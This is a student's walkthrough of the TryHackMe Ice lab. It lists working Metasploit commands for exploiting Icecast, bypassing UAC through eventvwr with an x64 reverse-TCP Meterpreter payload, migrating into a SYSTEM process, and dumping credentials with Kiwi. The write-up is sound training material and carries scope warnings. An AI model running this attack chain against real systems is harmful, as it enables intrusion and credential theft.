# TryHackMe: Ice --- Windows Privilege Escalation Walkthrough

A practical, step-by-step walkthrough of the **TryHackMe Ice** room,
documenting the path from initial access to `NT AUTHORITY\SYSTEM`
privileges.

> **Lab scope:** This guide is for the authorized TryHackMe Ice
> environment only. Use the techniques only in systems you own or have
> explicit permission to test.

## Table of Contents

-   [Overview](#overview)
-   [Lab Details](#lab-details)
-   [Tools Used](#tools-used)
-   [Walkthrough](#walkthrough)
    -   [1. Reconnaissance and Port
        Scanning](#1-reconnaissance-and-port-scanning)
    -   [2. Initial Access Through
        Icecast](#2-initial-access-through-icecast)
    -   [3. Enumerating the Target](#3-enumerating-the-target)
    -   [4. Running the Local Exploit
        Suggester](#4-running-the-local-exploit-suggester)
    -   [5. Troubleshooting the Payload
        Architecture](#5-troubleshooting-the-payload-architecture)
    -   [6. Bypassing UAC with Eventvwr](#6-bypassing-uac-with-eventvwr)
    -   [7. Migrating to a SYSTEM
        Process](#7-migrating-to-a-system-process)
    -   [8. Dumping Credentials with
        Kiwi](#8-dumping-credentials-with-kiwi)
-   [Key Findings](#key-findings)
-   [Lessons Learned](#lessons-learned)
-   [Important Security Note](#important-security-note)
-   [Author](#author)

## Overview

The Ice room provides a Windows exploitation and privilege-escalation
lab. The walkthrough follows these main stages:

1.  Identify exposed services on the target.
2.  Exploit the Icecast service to obtain an initial Meterpreter
    session.
3.  Enumerate the Windows host and identify possible local
    privilege-escalation paths.
4.  Resolve a payload architecture mismatch.
5.  Use the `bypassuac_eventvwr` module to obtain an elevated session.
6.  Migrate to a process running as `NT AUTHORITY\SYSTEM`.
7.  Load the Kiwi extension and enumerate credentials in the lab
    environment.

This README records the successful path as well as a failed UAC-bypass
attempt encountered during troubleshooting.

## Lab Details

  --------------------------------------------------------------------------------
  Item                                Details
  ----------------------------------- --------------------------------------------
  Platform                            TryHackMe

  Room                                Ice

  Target hostname                     `DARK-PC`

  Operating system                    Windows 7 SP1, Build 7601

  Architecture                        x64

  Exposed services identified         MS-RDP (3389), Icecast (8000)

  Initial access                      Metasploit
                                      `exploit/windows/http/icecast_header`

  Privilege escalation                Metasploit
                                      `exploit/windows/local/bypassuac_eventvwr`

  Final privilege context             `NT AUTHORITY\SYSTEM`
  --------------------------------------------------------------------------------

Replace any target or VPN IP address in screenshots and terminal
examples with a placeholder such as `TARGET_IP` before publishing.

## Tools Used

-   Parrot OS
-   Nmap
-   Metasploit Framework
-   Meterpreter
-   Kiwi extension

## Walkthrough

### 1. Reconnaissance and Port Scanning

The first step was to scan the target to identify accessible ports and
services.

Run an Nmap service/version scan:

``` bash
nmap -sV -sC -oN ice-scan.txt TARGET_IP
```

The scan identified these relevant services:

  Port         Service
  ------------ -----------------------------------
  `3389/tcp`   Microsoft Remote Desktop (MS-RDP)
  `8000/tcp`   Icecast

The target was identified as `DARK-PC`, running Windows 7 SP1 (Build
7601) on a 64-bit operating system.

**Why this matters:** Service discovery helps identify potential entry
points. The Icecast service on port 8000 was selected for the
initial-access stage.

### 2. Initial Access Through Icecast

Metasploit was launched and the Icecast exploit module was selected:

``` text
msfconsole
use exploit/windows/http/icecast_header
show options
```

After setting the target and required options, the exploit was run:

``` text
set RHOSTS TARGET_IP
run
```

The exploit succeeded and opened a Meterpreter session.

The initial session was running under the `Dark` user context on
`DARK-PC`.

**Result:** Initial access was established through the Icecast service.

### 3. Enumerating the Target

After obtaining the Meterpreter session, the target system was
enumerated to understand its environment and privilege context.

Useful Meterpreter commands included:

``` text
getuid
sysinfo
getpid
```

The system information confirmed that the target operating system was
64-bit Windows.

The initial Meterpreter process, however, was an **x86 (32-bit)
process**. This distinction became important when selecting a local
privilege-escalation payload.

### 4. Running the Local Exploit Suggester

The local exploit suggester was used to identify possible
privilege-escalation modules:

``` text
run post/multi/recon/local_exploit_suggester
```

One of the suggested modules was:

``` text
exploit/windows/local/bypassuac_comhijack
```

The first attempt with this module did not produce the elevated session
required for the next stage.

### 5. Troubleshooting the Payload Architecture

The first payload configuration produced an architecture error
indicating that an x86 payload had been selected for an x64 system.

The important distinction was:

-   The **target operating system** was x64.
-   The **initial Meterpreter process** was x86.
-   The local exploit required a payload compatible with the target
    architecture.

The payload was changed to:

``` text
set payload windows/x64/meterpreter/reverse_tcp
```

The `bypassuac_comhijack` attempt proceeded further, but it still did
not create a new Meterpreter session.

**Troubleshooting lesson:** A module completing its checks or running
its steps does not necessarily mean privilege escalation succeeded.
Confirm success by checking whether a new session was created and
verifying its identity.

### 6. Bypassing UAC with Eventvwr

A different UAC-bypass module was then selected:

``` text
use exploit/windows/local/bypassuac_eventvwr
show options
```

The target and payload options were configured as required. The x64
Meterpreter reverse TCP payload was used:

``` text
set payload windows/x64/meterpreter/reverse_tcp
```

The module was executed:

``` text
run
```

This attempt successfully opened a new elevated Meterpreter session.

Interact with the new session:

``` text
sessions
sessions -i 2
```

The session number may differ in another run. Use the number shown in
your own Metasploit output.

**Result:** A new elevated session was obtained.

### 7. Migrating to a SYSTEM Process

The process list was reviewed:

``` text
ps
```

The `spoolsv.exe` process (Print Spooler) was selected as the migration
target.

Migration was performed with:

``` text
migrate -N spoolsv.exe
```

The session identity was then checked:

``` text
getuid
```

The result showed:

``` text
NT AUTHORITY\SYSTEM
```

**Result:** The Meterpreter session was running with SYSTEM-level
privileges.

### 8. Dumping Credentials with Kiwi

With the elevated session active, the Kiwi extension was loaded:

``` text
load kiwi
```

Available Kiwi commands were reviewed:

``` text
help
```

The credential enumeration command used in the lab was:

``` text
creds_all
```

The command returned credential information for accounts on the target,
including information associated with the `Dark` account.

**Important:** Do not publish recovered passwords, password hashes,
tokens, or other authentication material in a public repository. Redact
them from screenshots and terminal output. Any lab password should be
treated as compromised and must never be reused.

## Key Findings

-   Nmap identified Icecast on TCP port `8000` and Microsoft Remote
    Desktop on TCP port `3389`.
-   The target was a 64-bit Windows 7 SP1 system named `DARK-PC`.
-   The Icecast Metasploit module provided the initial Meterpreter
    session.
-   The initial Meterpreter process was x86 even though the target
    operating system was x64.
-   The `bypassuac_comhijack` attempt did not create a new session.
-   The `bypassuac_eventvwr` module successfully created an elevated
    session.
-   Migrating to `spoolsv.exe` resulted in a session running as
    `NT AUTHORITY\SYSTEM`.
-   Kiwi's `creds_all` command retrieved credential information from the
    lab host.

## Lessons Learned

1.  **Enumerate before exploiting.** Identifying ports, services,
    hostnames, and operating-system details helps guide the next steps.
2.  **Check architecture compatibility.** A 32-bit Meterpreter process
    on a 64-bit operating system can affect payload selection.
3.  **Verify exploit results.** Do not assume a module succeeded just
    because it ran. Check for a new session and verify the session's
    privileges.
4.  **Understand privilege levels.** An elevated administrator context
    is not automatically the same as `NT AUTHORITY\SYSTEM`.
5.  **Verify after migration.** Use `getuid` to confirm the resulting
    security context.
6.  **Handle credentials responsibly.** Never expose recovered secrets
    in public write-ups or reuse passwords discovered during a lab.

## Important Security Note

This walkthrough is intended for educational use in the TryHackMe lab.
Do not run these techniques against systems without explicit
authorization.

Before publishing this repository:

-   Replace private or environment-specific IP addresses with
    placeholders.
-   Remove VPN configuration details and personal information from
    screenshots.
-   Redact passwords, hashes, tokens, and other credentials.
-   Review terminal logs for accidental disclosure of secrets.
-   Do not include credentials in HTML source, JavaScript, comments,
    metadata, or Git history.

## Author

**Asahel Kipkemei**\
Cyber Security Student \| NUST

-   Email: <mail@asahelkipkemeimutai.me>
-   LinkedIn: \[Add your LinkedIn profile URL\]
-   TryHackMe: \[Add your TryHackMe profile URL\]

------------------------------------------------------------------------

*This project documents my practical learning process while completing
the TryHackMe Ice room. The commands and outcomes are presented as a
learning record; details such as target IP addresses and session numbers
may differ between lab instances.*
